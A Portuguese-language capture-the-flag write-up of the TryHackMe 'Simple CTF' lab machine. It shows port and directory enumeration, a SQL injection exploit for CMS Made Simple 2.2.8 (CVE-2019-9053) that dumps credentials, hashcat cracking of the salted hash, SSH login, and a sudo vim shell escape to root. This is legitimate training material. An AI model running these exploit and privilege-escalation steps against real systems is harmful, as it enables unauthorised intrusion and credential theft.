---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - Simple CTF - Fácil
date: 2024-01-24 18:10:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, linux, sudo, sqli, facil]     # TAG names should always be lowercase
show_image_post: true
---

![Logo](/assets/img/simple.png){: w="100" h="100" .left}

---

# **CTF - Simple CTF**
---
---
## **Enumeração**


### nmap

```shell
┌──(kali💀kali)-[~/thm/simplectf]
└─$ sudo nmap -sV -Pn --min-rate 10000 --stats-every=7s 10.10.17.200 -oA nmap       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-22 22:29 -03
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 22:29 (0:00:04 remaining)
Nmap scan report for 10.10.17.200
Host is up (0.22s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.03 seconds
```
{: .nolineno }

### ffuf

```shell
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.17.200/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .php .txt .old .bkp 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess.txt           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 231ms]
.htaccess.old           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 234ms]
.htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 238ms]
.htaccess.php           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 235ms]
.htpasswd               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 235ms]
.htpasswd.php           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 236ms]
.htpasswd.txt           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 236ms]
.htaccess.bkp           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 239ms]
.htpasswd.bkp           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 222ms]
.htpasswd.old           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 225ms]
robots.txt              [Status: 200, Size: 929, Words: 176, Lines: 33, Duration: 226ms]
robots.txt              [Status: 200, Size: 929, Words: 176, Lines: 33, Duration: 231ms]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 215ms]
simple                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 212ms]
:: Progress: [102345/102345] :: Job [1/1] :: 148 req/sec :: Duration: [0:03:16] :: Errors: 170 ::
```
{: .nolineno }

`http://10.10.17.200/robots.txt`

```text
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```
{: .nolineno }

Aplicação  CMS Made Simple version 2.2.8 (CVE-2019-9053) em 

`http://10.10.17.200/simple/`  
Página de login em  
`http://10.10.17.200/simple/admin/login.php`

![Alt text](/assets/img/simplectf1.png)

## **Acesso**
### Exploit

```shell
┌──(kali💀kali)-[~]
└─$ searchsploit CMS Made Simple 2.2.8                                  
------------------------------------------------------------------------
 Exploit   
 Title                                                                  
------------------------------------------------------------------------
CMS Made Simple < 2.2.10 - SQL Injection    
```       
{: .nolineno }
Baixei esse exploit
<https://github.com/Mahamedm/CVE-2019-9053-Exploit-Python-3>  
O exploit usa de SQLI pra obter os dados abaixo.

```shell
./exploit.py -u http://10.10.17.200/simple/

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```
{: .nolineno }
![Alt text](/assets/img/simplectf2.png)

Montei a hash dessa forma depois de pesquisas.
`0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2`  
Parece que está correto o formato da hash que montei
![Alt text](/assets/img/simplectf3.png)

Usei o hashcat já que com o john não consegui, eu uso o hashcat no googlecloudshell, pois a VM do Kali não consegue, por falta de memória.

```shell
XXXXX@cloudshell:~/hashcat-6.2.6$ ./hashcat.bin -m 20 ~/hash.txt ~/rockyou.txt

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Tue Jan 23 04:05:35 2024 (1 sec)
Time.Estimated...: Tue Jan 23 04:05:36 2024 (0 secs)
```
{: .nolineno }
## **Escalação de privilégio**
### Escalando para usuário mitch
Logando com as credenciais mitch:secret no site, e nesse menu, podemos fazer upload de webshell

![Alt text](/assets/img/simplectf4.png)

Testei as credenciais via ssh e também conectou, vou manter via ssh.
### Primeira flag
```shell
┌──(kali💀kali)-[~/thm/simplectf]
└─$ ssh mitch@10.10.17.200 -p 2222
The authenticity of host '[10.10.17.200]:2222 ([10.10.17.200]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.17.200]:2222' (ED25519) to the list of known hosts.
mitch@10.10.17.200's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 

$ ls
user.txt
$ cat us	
cat: us: No such file or directory
$ whereis python
python: /usr/bin/python3.5m /usr/bin/python2.7 /usr/bin/python /usr/bin/python3.5 /usr/lib/python2.7 /usr/lib/python3.5 /etc/python2.7 /etc/python /etc/python3.5 /usr/local/lib/python2.7 /usr/local/lib/python3.5 /usr/include/python3.5m /usr/share/python /usr/share/man/man1/python.1.gz
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
mitch@Machine:~$ cat user.txt 
G00d j0b, keep up!
mitch@Machine:~$ ls
user.txt
mitch@Machine:~$ ls /home/
mitch  sunbath
```
{: .nolineno }
### Escalando para root

posso usar sudo -l e o vim

```shell
mitch@Machine:/home$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```
{: .nolineno }
Consultando o <https://gtfobins.github.io/gtfobins/vim/>  
`sudo vim -c ':!/bin/sh'` para pegar uma root shell
![Alt text](/assets/img/simplectf5.png)

Na home existe outro usuário `sunbath`, mas nada interessante foi encontrado.

### Segunda flag
![Alt text](/assets/img/simplectf6.png)

**Conhecimentos adquiridos:**
- CVE da aplicação CMS Made Simple 2.2.8
- Como montar a hash para usar no hashcat